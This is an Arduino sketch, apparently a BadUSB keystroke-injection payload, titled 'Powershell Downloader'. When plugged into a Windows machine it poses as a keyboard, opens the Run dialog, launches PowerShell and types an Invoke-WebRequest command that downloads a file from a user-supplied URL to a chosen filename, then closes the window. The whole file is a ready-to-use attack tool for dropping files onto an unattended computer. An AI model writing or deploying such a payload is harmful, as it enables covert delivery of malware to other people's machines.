/*
 * Powershell Downloader
 * It downloads anything by just URL and save with custom name and extension.
 * Author - WireBits
 */
 
#include<Keyboard.h>
void setup()
{
 Keyboard.begin();
 delay(1000);
 Keyboard.press(KEY_LEFT_GUI);
 Keyboard.press('r');
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.print("powershell");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(1000);
 Keyboard.print("Invoke-WebRequest -Uri \"https://url\" -OutFile \"name.xxx\"");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 delay(3000);
 Keyboard.print("exit");
 delay(1000);
 Keyboard.press(KEY_RETURN);
 Keyboard.releaseAll();
 Keyboard.end();
}
void loop()
{
 //Nothing to do here ;)
}
